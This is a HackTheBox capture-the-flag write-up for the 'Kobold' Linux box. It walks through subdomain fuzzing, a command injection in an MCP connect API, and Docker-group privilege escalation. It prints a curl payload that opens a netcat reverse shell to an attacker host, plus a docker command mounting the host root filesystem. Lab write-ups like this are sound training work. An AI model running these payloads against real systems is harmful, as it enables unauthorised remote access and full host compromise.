# Kobold — HackTheBox Writeup

**Difficulty:** Easy  
**OS:** Linux  
**Release Date:** 21 Mar 2026  
**Topics:** Subdomain Enumeration, CVE-2026-23520 (Arcane MCP Unauthenticated Command Injection), Docker Group Privilege Escalation, /etc/gshadow vs /etc/group Inconsistency

---

## Summary

Kobold is a Linux box running a multi-service web application behind nginx with HTTPS and wildcard virtual hosting. Initial access exploits an unauthenticated command injection vulnerability in the Arcane Docker Management platform's MCP API endpoint. Privilege escalation abuses a misconfiguration between `/etc/gshadow` and `/etc/group` that allows switching into the Docker group, then mounting the host filesystem via the Docker socket.

---

## Reconnaissance

```bash
nmap -sV -sC -T4 <TARGET_IP>
# Ports: 22 (SSH), 80 (HTTP redirect), 443 (HTTPS nginx/1.24.0)
```

The TLS certificate reveals: `kobold.htb` and `*.kobold.htb`. Add to `/etc/hosts`:
```
<TARGET_IP> kobold.htb mcp.kobold.htb
```

Subdomain brute-force:
```bash
ffuf -u "https://<TARGET_IP>" -k -H "Host: FUZZ.kobold.htb" \
  -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
  -mc all -c -fs 154
# Discovers: mcp.kobold.htb
```

The main domain hosts the **Kobold Operations Suite** (static, nginx). `mcp.kobold.htb` runs an **MCP Inspector** — a Node.js tool for connecting to Model Context Protocol servers.

---

## Exploitation — CVE-2026-23520 (Unauthenticated Command Injection)

Arcane v1.13.0 exposes `/api/mcp/connect` without authentication. The endpoint launches MCP server processes but passes user-supplied `command` and `args` directly to the shell with no sanitisation.

```bash
# Start listener
nc -lvnp 4444

# Fire exploit — inject reverse shell into args
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "command": "/bin/sh",
    "args": ["-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f"]
  }'
```

Shell lands as user `ben`.

Upgrade the shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## User Flag

```bash
cat /home/ben/user.txt
```

---

## Privilege Escalation — Docker Group Inconsistency

Check group memberships:
```bash
id
# uid=1001(ben) gid=1001(ben) groups=1001(ben),1002(operator)
```

`/etc/group` shows `ben` in `operator`, but `/etc/gshadow` has `ben` listed under `docker` as well. This inconsistency means `sg` (switch group) can be used to activate Docker privileges without needing a password:

```bash
sg docker -c "docker ps"
# Lists running containers — Docker access confirmed
```

Mount the host filesystem:
```bash
sg docker -c "docker run -v /:/host --rm -it <LOCAL_IMAGE> chroot /host /bin/bash"
```

Root shell on the host:
```bash
cat /root/root.txt
```

---

## Key Takeaways

- Always enumerate subdomains — MCP inspector endpoints are increasingly common attack surfaces as AI tooling proliferates.
- Unauthenticated management APIs are critical findings even if they look like developer tooling.
- The discrepancy between `/etc/group` and `/etc/gshadow` is an unusual but real privesc vector — always cross-reference both files.
- Docker socket access = root if the host filesystem can be mounted.

---

## Tools Used

`nmap` `ffuf` `curl` `netcat` `pwncat` `docker`
